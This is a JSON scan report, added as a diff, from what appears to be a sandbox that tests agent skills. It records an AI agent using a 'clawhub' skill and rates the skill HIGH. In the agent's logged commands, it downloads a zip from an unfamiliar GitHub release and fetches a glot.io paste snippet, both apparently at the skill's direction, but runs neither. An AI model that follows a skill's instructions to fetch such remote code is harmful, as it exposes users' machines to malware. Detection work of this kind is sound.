@@ -1,0 +1,956 @@
+{
+ "scan_id": "rh-20261106-154506-4cc25c",
+ "package": "clawhub",
+ "version": "skill-161caf97101b",
+ "integrity": "sha512-/S6U2LrnUE807LGgmJdJvEAMQ8W29E9SOWm6fCEyukOCsQCRtNDxNo7n0HulhPAwoY1qEiYux733eHchU0WN9w==",
+ "verdict": "HIGH",
+ "reasons": [
+  "REVIEW: network attempts to unpkg.com",
+  "HIGH: sent the agent to a file-drop or paste site (glot.io)",
+  "REVIEW: had the agent download a release file (hedefbari/openclaw-agent)"
+ ],
+ "container_aware": false,
+ "seconds": 22.24,
+ "evidence": {
+  "exfil_matches": [],
+  "machine_leaks": [],
+  "token_uses": [],
+  "bait_reads": [],
+  "connects": [
+   "example.com",
+   "github.com",
+   "glot.io",
+   "registry.npmjs.org",
+   "unpkg.com",
+   "www.clawhub.ai"
+  ],
+  "execs": [
+   [
+    [
+     "node",
+     "/work/.rh/agent.js"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "ls ~/.agents/skills/ 2>/dev/null && echo \"---\" && cat ~/.agents/skills/clawhub/SKILL.md 2>/dev/null"
+    ],
+    false
+   ],
+   [
+    [
+     "ls",
+     "/home/dev/.agents/skills/"
+    ],
+    false
+   ],
+   [
+    [
+     "cat",
+     "/home/dev/.agents/skills/clawhub/SKILL.md"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "pwd && ls -la"
+    ],
+    false
+   ],
+   [
+    [
+     "ls",
+     "-la"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "cd /work/project && for f in AGENTS.md CLAUDE.md MEMORY.md README.md package.json; do echo \"=== $f ===\"; cat $f; done; echo \"=== src ===\"; ls -la src"
+    ],
+    false
+   ],
+   [
+    [
+     "cat",
+     "AGENTS.md"
+    ],
+    false
+   ],
+   [
+    [
+     "cat",
+     "CLAUDE.md"
+    ],
+    false
+   ],
+   [
+    [
+     "cat",
+     "MEMORY.md"
+    ],
+    false
+   ],
+   [
+    [
+     "cat",
+     "README.md"
+    ],
+    false
+   ],
+   [
+    [
+     "cat",
+     "package.json"
+    ],
+    false
+   ],
+   [
+    [
+     "ls",
+     "-la",
+     "src"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "which clawhub node npm 2>&1; echo \"---\"; node -v 2>&1; npm -v 2>&1"
+    ],
+    false
+   ],
+   [
+    [
+     "which",
+     "clawhub",
+     "node",
+     "npm"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "-v"
+    ],
+    false
+   ],
+   [
+    [
+     "npm",
+     "-v"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "-v"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "cd /work/project && npm view clawhub version dist-tags 2>&1 | head -20"
+    ],
+    false
+   ],
+   [
+    [
+     "head",
+     "-20"
+    ],
+    false
+   ],
+   [
+    [
+     "npm",
+     "view",
+     "clawhub",
+     "version",
+     "dist-tags"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "view",
+     "clawhub",
+     "version",
+     "dist-tags"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "cd /work/project && npm view clawhub version 2>&1; echo \"EXIT=$?\""
+    ],
+    false
+   ],
+   [
+    [
+     "npm",
+     "view",
+     "clawhub",
+     "version"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "view",
+     "clawhub",
+     "version"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c"
+    ],
+    false
+   ],
+   [
+    [
+     "tail",
+     "-20"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "120",
+     "npm",
+     "i",
+     "-g",
+     "clawhub"
+    ],
+    false
+   ],
+   [
+    [
+     "npm",
+     "i",
+     "-g",
+     "clawhub"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "i",
+     "-g",
+     "clawhub"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "cd /work/project && timeout 60 npm view clawhub --json 2>&1 | head -30; echo \"---registry---\"; npm config get registry"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "60",
+     "npm",
+     "view",
+     "clawhub",
+     "--json"
+    ],
+    false
+   ],
+   [
+    [
+     "head",
+     "-30"
+    ],
+    false
+   ],
+   [
+    [
+     "npm",
+     "view",
+     "clawhub",
+     "--json"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "view",
+     "clawhub",
+     "--json"
+    ],
+    false
+   ],
+   [
+    [
+     "npm",
+     "config",
+     "get",
+     "registry"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "config",
+     "get",
+     "registry"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "timeout 30 curl -sS -o /dev/null -w \"%{http_code}\\n\" https://registry.npmjs.org/clawhub 2>&1; echo \"---\"; timeout 30 curl -sS https://registry.npmjs.org/clawhub 2>&1 | head -c 300"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "%{http_code}\\n",
+     "https://registry.npmjs.org/clawhub"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "%{http_code}\\n",
+     "https://registry.npmjs.org/clawhub"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "https://registry.npmjs.org/clawhub"
+    ],
+    false
+   ],
+   [
+    [
+     "head",
+     "-c",
+     "300"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "https://registry.npmjs.org/clawhub"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "timeout 30 curl -sS https://registry.npmjs.org/express 2>&1 | head -c 200; echo; echo \"=== clawhub search endpoint ===\"; timeout 30 curl -sS -o /dev/null -w \"%{http_code}\\n\" https://www.clawhub.ai/ 2>&1"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "https://registry.npmjs.org/express"
+    ],
+    false
+   ],
+   [
+    [
+     "head",
+     "-c",
+     "200"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "https://registry.npmjs.org/express"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "%{http_code}\\n",
+     "https://www.clawhub.ai/"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "%{http_code}\\n",
+     "https://www.clawhub.ai/"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "timeout 30 curl -sS https://www.clawhub.ai/ 2>&1 | head -c 1500"
+    ],
+    false
+   ],
+   [
+    [
+     "head",
+     "-c",
+     "1500"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "https://www.clawhub.ai/"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "https://www.clawhub.ai/"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "timeout 30 curl -sS -o /dev/null -w \"%{http_code}\\n\" https://github.com/hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip 2>&1; echo \"--- glot ---\"; timeout 30 curl -sS -o /dev/null -w \"%{http_code}\\n\" https://glot.io/snippets/hfdxv8uyaf 2>&1"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "%{http_code}\\n",
+     "https://github.com/hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "%{http_code}\\n",
+     "https://github.com/hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "%{http_code}\\n",
+     "https://glot.io/snippets/hfdxv8uyaf"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "%{http_code}\\n",
+     "https://glot.io/snippets/hfdxv8uyaf"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "cd /tmp && timeout 60 curl -sSL -o oca.zip https://github.com/hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip 2>&1; ls -la oca.zip; file oca.zip; echo \"=== head ===\"; head -c 400 oca.zip | cat -v"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "60",
+     "curl",
+     "-sSL",
+     "-o",
+     "oca.zip",
+     "https://github.com/hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sSL",
+     "-o",
+     "oca.zip",
+     "https://github.com/hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip"
+    ],
+    false
+   ],
+   [
+    [
+     "ls",
+     "-la",
+     "oca.zip"
+    ],
+    false
+   ],
+   [
+    [
+     "head",
+     "-c",
+     "400",
+     "oca.zip"
+    ],
+    false
+   ],
+   [
+    [
+     "cat",
+     "-v"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "timeout 30 curl -sS https://glot.io/snippets/hfdxv8uyaf 2>&1 | head -c 800"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "https://glot.io/snippets/hfdxv8uyaf"
+    ],
+    false
+   ],
+   [
+    [
+     "head",
+     "-c",
+     "800"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "https://glot.io/snippets/hfdxv8uyaf"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "ls ~/.npm/_cacache 2>/dev/null && echo \"cache exists\"; echo \"--- search local for clawhub ---\"; find / -name \"*clawhub*\" -not -path \"*/proc/*\" 2>/dev/null | head -20"
+    ],
+    false
+   ],
+   [
+    [
+     "ls",
+     "/home/dev/.npm/_cacache"
+    ],
+    false
+   ],
+   [
+    [
+     "find",
+     "/",
+     "-name",
+     "*clawhub*",
+     "-not",
+     "-path",
+     "*/proc/*"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "cd /tmp && timeout 60 npm i -g clawhub --registry https://registry.npmjs.org/ 2>&1 | tail -5; echo \"---try unpkg---\"; timeout 30 curl -sS https://unpkg.com/clawhub/package.json 2>&1 | head -c 200"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "60",
+     "npm",
+     "i",
+     "-g",
+     "clawhub",
+     "--registry",
+     "https://registry.npmjs.org/"
+    ],
+    false
+   ],
+   [
+    [
+     "tail",
+     "-5"
+    ],
+    false
+   ],
+   [
+    [
+     "npm",
+     "i",
+     "-g",
+     "clawhub",
+     "--registry",
+     "https://registry.npmjs.org/"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "i",
+     "-g",
+     "clawhub",
+     "--registry",
+     "https://registry.npmjs.org/"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "https://unpkg.com/clawhub/package.json"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "https://unpkg.com/clawhub/package.json"
+    ],
+    false
+   ],
+   [
+    [
+     "bash",
+     "-c",
+     "cd /tmp && timeout 30 curl -sS -o /dev/null -w \"example.com: %{http_code}\\n\" https://example.com; timeout 30 curl -sS https://example.com 2>&1 | head -c 200; echo; echo \"=== npm debug log ===\"; tail -25 /home/dev/.npm/_logs/2026-11-06T15_45_26_023Z-debug-0.log 2>/dev/null"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "example.com: %{http_code}\\n",
+     "https://example.com"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "-o",
+     "/dev/null",
+     "-w",
+     "example.com: %{http_code}\\n",
+     "https://example.com"
+    ],
+    false
+   ],
+   [
+    [
+     "timeout",
+     "30",
+     "curl",
+     "-sS",
+     "https://example.com"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sS",
+     "https://example.com"
+    ],
+    false
+   ],
+   [
+    [
+     "tail",
+     "-25",
+     "/home/dev/.npm/_logs/2026-11-06T15_45_26_023Z-debug-0.log"
+    ],
+    false
+   ]
+  ],
+  "writes": [],
+  "incomplete": [],
+  "deadline_killed": false,
+  "load_hang": false,
+  "probe_flags": [],
+  "ai_tool_calls": [],
+  "exfil_to": {},
+  "http_requests": [
+   "registry.npmjs.org GET /clawhub",
+   "registry.npmjs.org GET /clawhub",
+   "registry.npmjs.org GET /clawhub",
+   "registry.npmjs.org GET /clawhub",
+   "registry.npmjs.org GET /clawhub",
+   "registry.npmjs.org GET /clawhub",
+   "registry.npmjs.org GET /express",
+   "www.clawhub.ai GET /",
+   "www.clawhub.ai GET /",
+   "github.com GET /hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip",
+   "glot.io GET /snippets/hfdxv8uyaf",
+   "github.com GET /hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip",
+   "glot.io GET /snippets/hfdxv8uyaf",
+   "registry.npmjs.org GET /clawhub",
+   "unpkg.com GET /clawhub/package.json",
+   "example.com GET /",
+   "example.com GET /"
+  ],
+  "skill_root": "/home/dev/.agents/skills/clawhub/",
+  "stats_count": 4339
+ },
+ "sandbox": {
+  "deadline_killed": false,
+  "exit_code": 0,
+  "errors": [],
+  "seconds": 21.69,
+  "syscall_lines": 108340,
+  "unparsed": 0,
+  "sinkhole_records": 104,
+  "dependencies": "no dependencies"
+ },
+ "microvm": null,
+ "manifest": {},
+ "agent": {
+  "task": "Use the \"clawhub\" skill on this project for what it says it does: (its description).",
+  "model": "deepseek-v4.1-flash-1017",
+  "run": [
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"ls ~/.agents/skills/ 2>/dev/null && echo \\\"---\\\" && cat ~/.agents/skills/clawhub/SKILL.md 2>/dev/null\"}"
+     },
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"pwd && ls -la\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"cd /work/project && for f in AGENTS.md CLAUDE.md MEMORY.md README.md package.json; do echo \\\"=== $f ===\\\"; cat $f; done; echo \\\"=== src ===\\\"; ls -la src\"}"
+     },
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"which clawhub node npm 2>&1; echo \\\"---\\\"; node -v 2>&1; npm -v 2>&1\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"cd /work/project && npm view clawhub version dist-tags 2>&1 | head -20\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"cd /work/project && npm view clawhub version 2>&1; echo \\\"EXIT=$?\\\"\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"cd /work/project && timeout 120 npm i -g clawhub 2>&1 | tail -20; echo \\\"EXIT=${PIPESTATUS[0]}\\\"\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"cd /work/project && timeout 60 npm view clawhub --json 2>&1 | head -30; echo \\\"---registry---\\\"; npm config get registry\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"timeout 30 curl -sS -o /dev/null -w \\\"%{http_code}\\\\n\\\" https://registry.npmjs.org/clawhub 2>&1; echo \\\"---\\\"; timeout 30 curl -sS https://registry.npmjs.org/clawhub 2>&1 | head -c 300\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"timeout 30 curl -sS https://registry.npmjs.org/express 2>&1 | head -c 200; echo; echo \\\"=== clawhub search endpoint ===\\\"; timeout 30 curl -sS -o /dev/null -w \\\"%{http_code}\\\\n\\\" https://www.clawhub.ai/ 2>&1\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"timeout 30 curl -sS https://www.clawhub.ai/ 2>&1 | head -c 1500\"}"
+     },
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"timeout 30 curl -sS -o /dev/null -w \\\"%{http_code}\\\\n\\\" https://github.com/hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip 2>&1; echo \\\"--- glot ---\\\"; timeout 30 curl -sS -o /dev/null -w \\\"%{http_code}\\\\n\\\" https://glot.io/snippets/hfdxv8uyaf 2>&1\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"cd /tmp && timeout 60 curl -sSL -o oca.zip https://github.com/hedefbari/openclaw-agent/releases/download/latest/openclaw-agent.zip 2>&1; ls -la oca.zip; file oca.zip; echo \\\"=== head ===\\\"; head -c 400 oca.zip | cat -v\"}"
+     },
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"timeout 30 curl -sS https://glot.io/snippets/hfdxv8uyaf 2>&1 | head -c 800\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"ls ~/.npm/_cacache 2>/dev/null && echo \\\"cache exists\\\"; echo \\\"--- search local for clawhub ---\\\"; find / -name \\\"*clawhub*\\\" -not -path \\\"*/proc/*\\\" 2>/dev/null | head -20\"}"
+     },
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"cd /tmp && timeout 60 npm i -g clawhub --registry https://registry.npmjs.org/ 2>&1 | tail -5; echo \\\"---try unpkg---\\\"; timeout 30 curl -sS https://unpkg.com/clawhub/package.json 2>&1 | head -c 200\"}"
+     }
+    ]
+   },
+   {
+    "calls": [
+     {
+      "tool": "bash",
+      "arguments": "{\"command\": \"cd /tmp && timeout 30 curl -sS -o /dev/null -w \\\"example.com: %{http_code}\\\\n\\\" https://example.com; timeout 30 curl -sS https://example.com 2>&1 | head -c 200; echo; echo \\\"=== npm debug log ===\\\"; tail -25 /home/dev/.npm/_logs/2026-11-06T15_45_26_023Z-debug-0.log 2>/dev/null\"}"
+     }
+    ]
+   }
+  ],
+  "second_run": []
+ }
+}
